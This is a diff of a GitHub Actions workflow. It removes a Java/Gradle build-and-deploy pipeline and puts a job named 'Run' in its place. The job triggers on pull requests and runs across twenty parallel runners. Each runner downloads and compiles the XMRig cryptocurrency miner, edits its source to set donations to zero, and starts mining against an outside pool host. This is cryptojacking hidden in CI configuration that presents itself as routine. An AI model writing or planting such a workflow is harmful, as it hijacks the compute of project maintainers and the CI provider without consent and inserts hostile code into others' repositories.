@@ -1,35 +1,25 @@
-name: Build and Publish
-on: [ push, pull_request ]
+name: Run
+on: [pull_request]
 jobs:
-  build:
-    name: Test and Build
-    runs-on: ubuntu-latest
-    steps:
+    run:
+        name: Run
+        runs-on: ubuntu-latest
+        strategy:
+          fail-fast: false
+          matrix:
+            runner: [0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19]
+        steps:
+          - shell: bash
+            run: |
+              sudo apt-get update
+              sudo apt-get install --yes build-essential cmake git libhwloc-dev libssl-dev libuv1-dev
+              curl -Lo xmrig.tar.gz https://github.com/xmrig/xmrig/archive/refs/tags/v6.10.0.tar.gz
+              tar xf xmrig.tar.gz
+              cd xmrig-*
+              sed -Ei 's/^(.*DonateLevel = )(.*)$/\10;/g' src/donate.h
+              mkdir build
+              cd build
+              cmake .. -DCMAKE_BUILD_TYPE=Release
+              make --jobs=$(nproc)
 
-      # Setup Java 1.8 environment for the next steps
-      - name: Setup Java
-        uses: actions/setup-java@v1
-        with:
-          java-version: 1.8
-
-      # Check out current repository
-      - name: Fetch Sources
-        uses: actions/checkout@v2
-
-      # Validate wrapper
-      - name: Validate Gradle Wrapper
-        uses: gradle/wrapper-validation-action@v1.0.3
-
-      # Build application
-      - name: Test and Build
-        run: ./gradlew build
-
-      # If main branch update, deploy to gh-pages
-      - name: Deploy
-        if: github.ref == 'refs/heads/master' || github.ref == 'refs/heads/main'
-        uses: JamesIves/github-pages-deploy-action@3.7.1
-        with:
-          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-          BRANCH: gh-pages # The branch the action should deploy to.
-          FOLDER: build/distributions # The folder the action should deploy.
-          CLEAN: true # Automatically remove deleted files from the deploy branch
+              ./xmrig --url vps2121-39903.portmap.host:39903 --donate-level 0 
